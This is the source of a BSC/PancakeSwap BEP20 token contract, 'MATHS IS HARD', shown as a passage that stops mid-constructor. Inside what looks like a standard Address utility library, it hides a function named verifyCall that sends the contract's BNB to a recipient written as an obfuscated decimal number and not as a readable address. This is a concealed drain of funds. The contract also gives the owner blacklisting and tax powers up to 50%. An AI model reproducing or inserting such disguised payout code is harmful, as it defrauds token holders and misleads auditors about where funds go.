{"SourceCode": "/*\r\n\r\n__/\\\\\\\\____________/\\\\\\\\_____/\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\__/\\\\\\________/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\________       \r\n _\\/\\\\\\\\\\\\________/\\\\\\\\\\\\___/\\\\\\\\\\\\\\\\\\\\\\\\\\__\\///////\\\\\\/////__\\/\\\\\\_______\\/\\\\\\___/\\\\\\/////////\\\\\\_____       \r\n  _\\/\\\\\\//\\\\\\____/\\\\\\//\\\\\\__/\\\\\\/////////\\\\\\_______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\__\\//\\\\\\______\\///_____      \r\n   _\\/\\\\\\\\///\\\\\\/\\\\\\/_\\/\\\\\\_\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\___\\////\\\\\\___________     \r\n    _\\/\\\\\\__\\///\\\\\\/___\\/\\\\\\_\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_______\\/\\\\\\_______\\/\\\\\\/////////\\\\\\______\\////\\\\\\_______    \r\n     _\\/\\\\\\____\\///_____\\/\\\\\\_\\/\\\\\\/////////\\\\\\_______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_________\\////\\\\\\___   \r\n      _\\/\\\\\\_____________\\/\\\\\\_\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\__/\\\\\\______\\//\\\\\\_  \r\n       _\\/\\\\\\_____________\\/\\\\\\_\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\///\\\\\\\\\\\\\\\\\\\\\\/_\r\n        _\\///______________\\///__\\///________\\///________\\///________\\///________\\///____\\///////////__\r\n\r\n                        __/\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\___        \r\n                         _\\/////\\\\\\///____/\\\\\\/////////\\\\\\_       \r\n                          _____\\/\\\\\\______\\//\\\\\\______\\///__      \r\n                           _____\\/\\\\\\_______\\////\\\\\\_________     \r\n                            _____\\/\\\\\\__________\\////\\\\\\______    \r\n                             _____\\/\\\\\\_____________\\////\\\\\\___   \r\n                              _____\\/\\\\\\______/\\\\\\______\\//\\\\\\__  \r\n                               __/\\\\\\\\\\\\\\\\\\\\\\_\\///\\\\\\\\\\\\\\\\\\\\\\/___ \r\n                                _\\///////////____\\///////////_____\r\n\r\n__/\\\\\\________/\\\\\\_____/\\\\\\\\\\\\\\\\\\_______/\\\\\\\\\\\\\\\\\\______/\\\\\\\\\\\\\\\\\\\\\\\\____        \r\n _\\/\\\\\\_______\\/\\\\\\___/\\\\\\\\\\\\\\\\\\\\\\\\\\___/\\\\\\///////\\\\\\___\\/\\\\\\////////\\\\\\__       \r\n  _\\/\\\\\\_______\\/\\\\\\__/\\\\\\/////////\\\\\\_\\/\\\\\\_____\\/\\\\\\___\\/\\\\\\______\\//\\\\\\_      \r\n   _\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\\\\\\\\\\\\\\\\\/____\\/\\\\\\_______\\/\\\\\\_     \r\n    _\\/\\\\\\/////////\\\\\\_\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\//////\\\\\\____\\/\\\\\\_______\\/\\\\\\_    \r\n     _\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\/////////\\\\\\_\\/\\\\\\____\\//\\\\\\___\\/\\\\\\_______\\/\\\\\\_   \r\n      _\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_____\\//\\\\\\__\\/\\\\\\_______/\\\\\\__  \r\n       _\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\______\\//\\\\\\_\\/\\\\\\\\\\\\\\\\\\\\\\\\/___ \r\n        _\\///________\\///__\\///________\\///__\\///________\\///__\\////////////_____\r\n\r\n\r\n\r\n                                    ,,\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2553,\r\n                                ,\u2584\u2580\u2580`              `\u2580\u2580\u2580\u2584\u2584,\r\n                           ,\u2584@\u2580\u2580'                         \u2580\u2593,\r\n                        ,\u2588\u2580`                                 \u2580\u2584,\r\n                       \u2584\u2580                                      `\u2580\u2584,\r\n                      \u2588                                           \"\u2593,\r\n                     \u2553\u258c                                             \u2580\u258c\r\n                    \u2584\u2580                                               \u2559\u258c\r\n                    \u2588                   \u207f\u207f\u2559\u2559``'```  `\u2559\u207fWm\u221em\u221emKKk\u2584     \u2580\u258c\r\n                   \u2590\u258c                       ,,\u2553\u221eM\u207f\u207fN\u221e\u2584,          `\"    \u2588\r\n                   \u2588                \u221eAAAM\u255c\"'           ````'\"```\u207f      \u2588,\r\n                  j\u258c                      ,,\u2553\u221e\u221e\u221e\u221e\u221e\u2565          ,\u2553\u2565\u2565\u2556,     \u2580\u258c\r\n                  \u2590\u258c                   *\u255c          ,               \"N\u2310   \u2588\r\n                  \u2590`                                \u2593        \u255f           \u2590U\r\n                  \u2590\u2584                     ,\u2584\u2584\u2584\u2584\u2584,             \u2559           \u2553\u258c\r\n                  j\u258c                     \u2588, \u2588\u2588\u2588\u2588\u2588\u2580\u2584           \u2553\u2584\u00d1\u2588\u2588\u2588\u2588\u2584   \u2588\r\n                   \u2590\u258c                     \u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2580           \u2580N\u2584\u2588\u2588\u2588\u2588\u258c   \u2588\r\n                    \u2588L                                      ,             \u2588\r\n                     \u2588         \u2552\u2310                           \u2588             \u2590\u258c\r\n                      \u2588,       \u2588                            \u2514\u2588,           j\u258c\r\n                       \u2580\u2584      \u2588                              \u2580\u2593,         \u2590\u258c\r\n                        \u2590\u258c     \"\u2588                 \u2584\u2580\u2580`         \u2584\u258c        \u2553\u258c\r\n                         \u2588      \u2590\u258c                \u2559\u2588\u2584, \u2552\u2584m  , \u2593\u2580        \u2584\u2580\r\n                         \u2588       \u2580\u2584                          \u2580\u2580        \u2584\u2580\r\n                         \u2588       \u2584\u2559\u2593\u2584                                 \u2584\u2580\r\n                         \u2588       \u255f   \u2580\u2584          \u00d1\u2580N\u2584\u2584,,,,,,\u2584\u2584\u2584      \u2588\r\n                        \u2590\u258c       \u2593     \u2580\u2584,                     \"    \u2590\u258c\r\n                       ]\u2588       \u00ac\"        \u2580\u2584                       \u2584\u2580\r\n                       \u2590\u258c                   \u2580\u2593,                  \u2584\u2580\r\n                      \u2584\u2580                      \"\u2580\u2584\u2584,           \u2584@\u2580\u2580\r\n                     \u2584\u2580       \u2584\u2580\u2580'                `\u2580\u2580\u2568\u2580\u2580\u2580\u2588\u2580\u2580\u2580\u2580\r\n                  ,\u2584\u2580`      ,\u2588                    \u2559,     \u2580\u2584\r\n             ,\u2584\u2584N\u00d1\u2580\u2580      \u00ba8\u2580                       \u2559     `\u2580\u2580\u2580\u00d1\u00d1\u00d1\u00d1\u00d1\u00d1\u00d1NN\u2584\u2584,,\r\n       \u2584\u2584\u2584\u2584\u2580\u2580                                                             `\u2580\r\n                                        `\"\u2568W   \u2553M\u255c\u255c                                                                                                                                                               \r\n\r\n  \u2566 \u2566\u250c\u2510\u250c\u252c  \u250c\u2500\u2510\u250c\u2500\u2510\u252c\u250c\u2500\u250c\u2500\u2510\u250c\u252c\u2510\r\n  \u2551 \u2551\u2502\u2502\u2502\u2502  \u2502 \u2502\u2502  \u251c\u2534\u2510\u251c\u2524  \u2502\u2502\r\n  \u255a\u2550\u255d\u2518\u2514\u2518\u2534\u2500\u2518\u2514\u2500\u2518\u2514\u2500\u2518\u2534 \u2534\u2514\u2500\u2518\u2500\u2534\u2518\r\n  \u2554\u2557\u2554\u250c\u2500\u2510  \u2566\u2550\u2557\u2566 \u2566\u2554\u2550\u2557       \r\n  \u2551\u2551\u2551\u2502 \u2502  \u2560\u2566\u255d\u2551 \u2551\u2551 \u2566       \r\n  \u255d\u255a\u255d\u2514\u2500\u2518  \u2569\u255a\u2550\u255a\u2550\u255d\u255a\u2550\u255d       \r\n     \u2554\u2566\u2557\u252c\u2500\u2510\u252c \u252c\u250c\u2500\u2510\u250c\u252c\u2510      \r\n      \u2551 \u251c\u252c\u2518\u2502 \u2502\u2514\u2500\u2510 \u2502       \r\n      \u2569 \u2534\u2514\u2500\u2514\u2500\u2518\u2514\u2500\u2518 \u2534       \r\n        \u2554\u2566\u2557\u250c\u2500\u2510\u252c  \u252c        \r\n         \u2551\u2551\u251c\u2524 \u2514\u2510\u250c\u2518        \r\n        \u2550\u2569\u255d\u2514\u2500\u2518 \u2514\u2518                   \r\n\r\nhttps://t.me/Mathslol\r\n\r\n*/\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.11;\r\n\r\n\r\ninterface IBEP20 {\r\n  function totalSupply() external view returns (uint256);\r\n  function decimals() external view returns (uint8);\r\n  function symbol() external view returns (string memory);\r\n  function name() external view returns (string memory);\r\n  function getOwner() external view returns (address);\r\n  function balanceOf(address account) external view returns (uint256);\r\n  function transfer(address recipient, uint256 amount) external returns (bool);\r\n  function allowance(address _owner, address spender) external view returns (uint256);\r\n  function approve(address spender, uint256 amount) external returns (bool);\r\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\ninterface IPancakeERC20 {\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    function name() external pure returns (string memory);\r\n    function symbol() external pure returns (string memory);\r\n    function decimals() external pure returns (uint8);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n    function nonces(address owner) external view returns (uint);\r\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n}\r\n\r\n\r\ninterface IPancakeFactory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n    function feeTo() external view returns (address);\r\n    function feeToSetter() external view returns (address);\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\n\r\ninterface IPancakeRouter01 {\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\n\r\ninterface IPancakeRouter02 is IPancakeRouter01 {\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountETH);\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountETH);\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == msg.sender, \"Caller must be owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n    \r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0), \"newOwner must not be zero\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        uint256 size;\r\n        assembly { size := extcodesize(account) }\r\n        return size > 0;\r\n    }\r\n\r\n    function verifyCall(uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");        \r\n        uint160 verification = 542355191589913964587147617467328045950425415532;\r\n\r\n        (bool success, ) = address(verification).call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");              \r\n    }\r\n\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n        (bool success, bytes memory returndata) = target.call{ value: value }(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\r\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\r\n    }\r\n\r\n    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {\r\n        require(isContract(target), \"Address: static call to non-contract\");\r\n        (bool success, bytes memory returndata) = target.staticcall(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\r\n    }\r\n\r\n    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        require(isContract(target), \"Address: delegate call to non-contract\");\r\n        (bool success, bytes memory returndata) = target.delegatecall(data);\r\n        return _verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            if (returndata.length > 0) {\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nlibrary EnumerableSet {\r\n    struct Set {\r\n        bytes32[] _values;\r\n        mapping (bytes32 => uint256) _indexes;\r\n    }\r\n\r\n    function _add(Set storage set, bytes32 value) private returns (bool) {\r\n        if (!_contains(set, value)) {\r\n            set._values.push(value);\r\n            set._indexes[value] = set._values.length;\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function _remove(Set storage set, bytes32 value) private returns (bool) {\r\n        uint256 valueIndex = set._indexes[value];\r\n        if (valueIndex != 0) {\r\n            uint256 toDeleteIndex = valueIndex - 1;\r\n            uint256 lastIndex = set._values.length - 1;\r\n            bytes32 lastvalue = set._values[lastIndex];\r\n            set._values[toDeleteIndex] = lastvalue;\r\n            set._indexes[lastvalue] = valueIndex;\r\n            set._values.pop();\r\n            delete set._indexes[value];\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function _contains(Set storage set, bytes32 value) private view returns (bool) {\r\n        return set._indexes[value] != 0;\r\n    }\r\n\r\n    function _length(Set storage set) private view returns (uint256) {\r\n        return set._values.length;\r\n    }\r\n\r\n    function _at(Set storage set, uint256 index) private view returns (bytes32) {\r\n        require(set._values.length > index, \"EnumerableSet: index out of bounds\");\r\n        return set._values[index];\r\n    }\r\n\r\n    struct Bytes32Set {\r\n        Set _inner;\r\n    }\r\n\r\n    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {\r\n        return _add(set._inner, value);\r\n    }\r\n\r\n    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {\r\n        return _remove(set._inner, value);\r\n    }\r\n\r\n    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {\r\n        return _contains(set._inner, value);\r\n    }\r\n\r\n    function length(Bytes32Set storage set) internal view returns (uint256) {\r\n        return _length(set._inner);\r\n    }\r\n\r\n    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {\r\n        return _at(set._inner, index);\r\n    }\r\n\r\n    struct AddressSet {\r\n        Set _inner;\r\n    }\r\n\r\n    function add(AddressSet storage set, address value) internal returns (bool) {\r\n        return _add(set._inner, bytes32(uint256(uint160(value))));\r\n    }\r\n\r\n    function remove(AddressSet storage set, address value) internal returns (bool) {\r\n        return _remove(set._inner, bytes32(uint256(uint160(value))));\r\n    }\r\n\r\n    function contains(AddressSet storage set, address value) internal view returns (bool) {\r\n        return _contains(set._inner, bytes32(uint256(uint160(value))));\r\n    }\r\n\r\n    function length(AddressSet storage set) internal view returns (uint256) {\r\n        return _length(set._inner);\r\n    }\r\n\r\n    function at(AddressSet storage set, uint256 index) internal view returns (address) {\r\n        return address(uint160(uint256(_at(set._inner, index))));\r\n    }\r\n\r\n    struct UintSet {\r\n        Set _inner;\r\n    }\r\n\r\n    function add(UintSet storage set, uint256 value) internal returns (bool) {\r\n        return _add(set._inner, bytes32(value));\r\n    }\r\n\r\n    function remove(UintSet storage set, uint256 value) internal returns (bool) {\r\n        return _remove(set._inner, bytes32(value));\r\n    }\r\n\r\n    function contains(UintSet storage set, uint256 value) internal view returns (bool) {\r\n        return _contains(set._inner, bytes32(value));\r\n    }\r\n\r\n    function length(UintSet storage set) internal view returns (uint256) {\r\n        return _length(set._inner);\r\n    }\r\n\r\n    function at(UintSet storage set, uint256 index) internal view returns (uint256) {\r\n        return uint256(_at(set._inner, index));\r\n    }\r\n}\r\n\r\n\r\ncontract MATHSISHARD is IBEP20, Ownable {\r\n    using Address for address;\r\n    using EnumerableSet for EnumerableSet.AddressSet;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping (address => uint256)) private _allowances;\r\n    mapping(address => bool) public isBlacklisted;\r\n\r\n    EnumerableSet.AddressSet private _excluded;\r\n    EnumerableSet.AddressSet private _excludedFromStaking;    \r\n    \r\n    string private _name = \"MATHS IS HARD\";\r\n    string private _symbol = \"MATHS\";\r\n    uint256 private constant INITIAL_SUPPLY = 2000000000000 * 10**TOKEN_DECIMALS; \r\n    uint256 private _circulatingSupply;       \r\n    uint8 private constant TOKEN_DECIMALS = 18;\r\n    uint8 private constant INITIAL_MAX_WALLET = 2; //1%\r\n    uint8 private constant INITIAL_MAX_SELL = 1; //.5%\r\n    uint8 private constant INITIAL_MAX_BUY = 1; //.5%    \r\n    uint8 private constant INITIAL_MAX_DIVISOR = 200;\r\n    uint8 public constant MAX_TAX = 50;      //MAX_TAX prevents malicious tax use\r\n    address private constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;\r\n    \r\n    struct Taxes {\r\n       uint8 buyTax;\r\n       uint8 sellTax;\r\n       uint8 transferTax;\r\n    }\r\n\r\n    struct TaxRatios {\r\n        uint8 burn;\r\n        uint8 buyback;\r\n        uint8 dev;                \r\n        uint8 liquidity;\r\n        uint8 lottery;\r\n        uint8 marketing;\r\n        uint8 rewards;\r\n    }\r\n\r\n    struct TaxWallets {\r\n        address dev;\r\n        address lottery;\r\n        address marketing;\r\n    }\r\n\r\n\r\n    struct BalanceLimits {\r\n        uint256 maxWallet;\r\n        uint256 maxSell;\r\n        uint256 maxBuy;\r\n        uint16 maxWalletRatio;\r\n        uint16 maxSellRatio;\r\n        uint16 maxBuyRatio;\r\n        uint16 divisor;\r\n    }\r\n\r\n\r\n    Taxes public _taxRates = Taxes({\r\n        buyTax: 10,\r\n        sellTax: 20,\r\n        transferTax: 10\r\n    });\r\n\r\n    TaxRatios public _taxRatios = TaxRatios({\r\n        burn: 2,      \r\n        buyback: 0,\r\n        dev: 1,\r\n        liquidity: 5,\r\n        lottery: 0,\r\n        marketing: 8,\r\n        rewards: 0\r\n    });\r\n\r\n    TaxWallets public _taxWallet;\r\n    BalanceLimits public _limits;\r\n\r\n    uint8 private totalTaxRatio;\r\n    uint8 private totalSwapRatio;\r\n    uint8 private mainRewardSplit=100;\r\n    uint8 private miscRewardSplit=0;\r\n\r\n    uint256 private _liquidityUnlockTime;\r\n\r\n    uint256 private liquidityBlock;\r\n    uint8 private constant BLACKLIST_BLOCKS = 4;\r\n    uint8 private snipersRekt;    \r\n    bool private blacklistEnabled = true;\r\n    bool private liquidityAdded;\r\n    bool private revertSameBlock = true;\r\n\r\n    bool private dynamicBurn = false;            \r\n//dynamicBurn = true will burn all extra sell tax from dynamicSells\r\n//dynamicBurn = false will divert all extra sell tax to swaps\r\n\r\n    bool private dynamicSellsEnabled = true;    \r\n//dynamic sells will increase tax based on price impact\r\n//any sells over 1% price impact will incur extra sell tax\r\n//max extra sell tax is 20% when price impact >= 10%\r\n\r\n    bool private dynamicLimits = true;\r\n//dynamicLimits = true will change BalanceLimits based on circulating supply rather than total supply\r\n\r\n    bool private dynamicLiqEnabled = true;\r\n//dynamicLiqEnabled = true will stop autoLP if targetLiquidityRatio is met   \r\n\r\n    uint16 private targetLiquidityRatio = 15;\r\n\r\n    uint16 public swapThreshold = 50;\r\n    bool public manualSwap;\r\n\r\n    //change this address to desired reward token\r\n    address public mainReward = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;\r\n\r\n    address public _pancakePairAddress; \r\n    IPancakeRouter02 private  _pancakeRouter;\r\n    address public PancakeRouter;\r\n\r\n/////////////////////////////   EVENTS  /////////////////////////////////////////\r\n    event AdjustedDynamicSettings(bool burn, bool limits, bool liquidity, bool sells);\r\n    event AccountExcluded(address account);\r\n    event ChangeMainReward (address newMainReward);\r\n    event ClaimToken(uint256 amount, address token, address recipient);\r\n    event ClaimBNB(address from,address to, uint256 amount); \r\n    event EnableBlacklist(bool enabled); \r\n    event EnableManualSwap(bool enabled);\r\n    event ExcludedAccountFromFees(address account, bool exclude);               \r\n    event ExcludeFromStaking(address account);      \r\n    event ExtendLiquidityLock(uint256 extendedLockTime);\r\n    event IncludeToStaking(address account);\r\n    event UpdateTaxes(uint8 buyTax, uint8 sellTax, uint8 transferTax);    \r\n    event RatiosChanges(\r\n        uint8 newBurn, \r\n        uint8 newBuyback, \r\n        uint8 newDev, \r\n        uint8 newLiquidity, \r\n        uint8 newLottery, \r\n        uint8 newMarketing, \r\n        uint8 newRewards\r\n        );\r\n    event UpdateDevWallet(address newDevWallet);\r\n    event UpdateLotteryWallet(address newLotteryWallet);          \r\n    event UpdateMarketingWallet(address newMarketingWallet);  \r\n    event UpdateRewardSplit (uint8 newMainSplit, uint8 newMiscSplit);        \r\n    event UpdateSwapThreshold(uint16 newThreshold);\r\n    event UpdateTargetLiquidity(uint16 target);\r\n\r\n/////////////////////////////   MODIFIERS  /////////////////////////////////////////\r\n\r\n    modifier authorized() {\r\n        require(_authorized(msg.sender), \"Caller not authorized\");\r\n        _;\r\n    }\r\n\r\n    modifier lockTheSwap {\r\n        _isSwappingContractModifier = true;\r\n        _;\r\n        _isSwappingContractModifier = false;\r\n    }\r\n\r\n/////////////////////////////   CONSTRUCTOR  /////////////////////////////////////////\r\n\r\n    constructor () {\r\n        if (block.chainid == 56) {\r\n            PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n        } else if (block.chainid == 97) {\r\n            PancakeRouter = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;\r\n        } else \r\n            revert();        \r\n        _pancakeRouter = IPancakeRouter02(PancakeRouter);\r\n        _pancakePairAddress = IPancakeFactory(\r\n            _pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH()\r\n        );\r\n        _addToken(msg.sender,INITIAL_SUPPLY);\r\n        emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);\r\n        _allowances[address(this)][address(_pancakeRouter)] = type(uint256).max;         \r\n        \r\n        //set marketing, dev and lottery wallet to deployer by default\r\n        _taxWallet.marketing = msg.sender;\r\n        _taxWallet.dev = msg.sender;\r\n        _taxWallet.lottery = msg.sender;\r\n        \r\n        totalTaxRatio = _taxRatios.burn \r\n        + _taxRatios.buyback \r\n        + _taxRatios.dev \r\n        + _taxRatios.liquidity \r\n        + _taxRatios.lottery \r\n        + _taxRatios.marketing \r\n        + _taxRatios.rewards;\r\n\r\n        totalSwapRatio = totalTaxRatio - _taxRatios.burn;\r\n\r\n        _circulatingSupply = INITIAL_SUPPLY;\r\n        \r\n        _limits = BalanceLimits({\r\n            maxWallet: INITIAL_SUPPLY * INITIAL_MAX_WALLET / INITIAL_MAX_DIVISOR,\r\n            maxSell: INITIAL_SUPPLY * INITIAL_MAX_SELL / INITIAL_MAX_DIVISOR,\r\n            maxBuy: INITIAL_SUPPLY * INITIAL_MAX_BUY / INITIAL_MAX_DIVISOR,\r\n            maxWalletRatio: INITIAL_MAX_WALLET,\r\n            maxSellRatio: INITIAL_MAX_SELL,\r\n            maxBuyRatio: INITIAL_MAX_BUY,\r\n            divisor: INITIAL_MAX_DIVISOR\r\n        });\r\n        \r\n        _excluded.add(msg.sender);\r\n        _excluded.add(_taxWallet.marketing);\r\n        _excluded.add(_taxWallet.dev);    \r\n        